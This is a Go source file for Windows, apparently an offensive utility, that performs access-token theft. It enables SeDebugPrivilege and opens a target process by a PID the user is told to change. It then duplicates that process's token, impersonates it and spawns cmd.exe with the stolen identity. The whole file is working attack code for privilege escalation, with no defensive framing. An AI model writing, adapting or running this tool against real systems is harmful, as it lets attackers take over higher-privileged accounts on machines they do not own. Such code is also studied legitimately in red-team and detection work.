package main

import (
	"os"
	"fmt"
	"unsafe"
	"syscall"
)

const (
	// CHANGE THIS
	PID = 0

	PROCESS_QUERY_INFORMATION 	= 0x0400
	TOKEN_PRIMARY			= 0x1
	TOKEN_DUPLICATE			= 0x0002
	TOKEN_ADJUST_DEFAULT		= 0x0080
	TOKEN_ADJUST_SESSIONID		= 0x0100
	TOKEN_QUERY             	= 0x0008
	TOKEN_ASSIGN_PRIMARY 		= 0x0001
	TOKEN_ADJUST_PRIVILEGES		= 0x0020
	SE_PRIVILEGE_ENABLED 		= 0x2
	SECURITY_IDENTIFICATION		= 0x2
	LOGON_WITH_PROFILE		= 0x00000001
)

var (
	kernel32            	= syscall.MustLoadDLL("kernel32.dll")
	GetCurrentProcess     	= kernel32.MustFindProc("GetCurrentProcess")
	OpenProcess    	   	= kernel32.MustFindProc("OpenProcess")
	OpenProcessToken   	= kernel32.MustFindProc("OpenProcessToken")
	CloseHandle 		= kernel32.MustFindProc("CloseHandle")
	GetLastError  		= kernel32.MustFindProc("GetLastError")

	advapi32            	= syscall.MustLoadDLL("advapi32.dll")
	DuplicateTokenEx  	= advapi32.MustFindProc("DuplicateTokenEx")
	CreateProcessWithTokenW = advapi32.MustFindProc("CreateProcessWithTokenW")
	ImpersonateLoggedOnUser = advapi32.MustFindProc("ImpersonateLoggedOnUser")
	AdjustTokenPrivileges   = advapi32.MustFindProc("AdjustTokenPrivileges")
	LookupPrivilegeValue    = advapi32.MustFindProc("LookupPrivilegeValueW")
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_ATTRIBUTES
}

func error(s string) {
	fmt.Printf("\n[!] %s failure\n", s)
	os.Exit(1)
}

func enable() {
	fmt.Println("[*] Enabling SeDebugPrivilege...")
	procHandle, _, _ := GetCurrentProcess.Call()

	var tokenHandle uintptr
	err, _, _ := OpenProcessToken.Call(procHandle, TOKEN_ADJUST_PRIVILEGES, uintptr(unsafe.Pointer(&tokenHandle)))
	if err == 0 {
		error("OpenProcessToken")
		return
	}

	seDebug, e := syscall.UTF16PtrFromString("SeDebugPrivilege")
	if e != nil {
		error("UTF16PtrFromString")
		return
	}

	var luid LUID
	err, _, _ = LookupPrivilegeValue.Call(0, uintptr(unsafe.Pointer(seDebug)), uintptr(unsafe.Pointer(&luid)))
	if err == 0 {
		error("LookupPrivilegeValue")
		return
	}

	var tokenPrivileges TOKEN_PRIVILEGES
	tokenPrivileges.PrivilegeCount = 1
	tokenPrivileges.Privileges[0].Luid = luid
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
	err, _, _ = AdjustTokenPrivileges.Call(tokenHandle, 0, uintptr(unsafe.Pointer(&tokenPrivileges)), uintptr(unsafe.Sizeof(tokenPrivileges)), 0, 0)
	if err == 0 {
		error("AdjustTokenPrivileges")
		return
	}
}

func steal() {
	fmt.Println("[*] Performing token theft... ")
	procHandle, _, _ := OpenProcess.Call(PROCESS_QUERY_INFORMATION, 0, uintptr(PID))
	if procHandle == 0 {
		error("OpenProcess")
		return
	}

	var tokenHandle uintptr
	err, _, _ := OpenProcessToken.Call(procHandle, TOKEN_DUPLICATE, uintptr(unsafe.Pointer(&tokenHandle)))
	if err == 0 {
		error("OpenProcessToken")
		return
	}

	var duplicateTokenHandle uintptr
	err, _, _ = DuplicateTokenEx.Call(tokenHandle, TOKEN_ADJUST_DEFAULT|TOKEN_ADJUST_SESSIONID|TOKEN_QUERY|TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY, 0, SECURITY_IDENTIFICATION, TOKEN_PRIMARY, uintptr(unsafe.Pointer(&duplicateTokenHandle)))
	if err == 0 {
		error("DuplicateTokenEx")
		return
	}

	path, e := syscall.UTF16PtrFromString("C:\\Windows\\System32\\cmd.exe")
	if e != nil {
		error("UTF16PtrFromString")
		return
	}

	err, _, _ = ImpersonateLoggedOnUser.Call(duplicateTokenHandle)
	if err == 0 {
		fmt.Println("[FAIL]")
		error("ImpersonateLoggedOnUser")
		return
	}

	startupInfo := new(syscall.StartupInfo)
	startupInfo.Cb = uint32(unsafe.Sizeof(*startupInfo))
	processInfo := new(syscall.ProcessInformation)
	err, _, _ = CreateProcessWithTokenW.Call(duplicateTokenHandle, LOGON_WITH_PROFILE, 0, uintptr(unsafe.Pointer(path)), 0, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(processInfo)))
	if err == 0 {
		error("CreateProcessWithTokenW")
		return
	}

	fmt.Println("[*] Token theft complete!")
}

func main() {
	enable()
	steal()
}
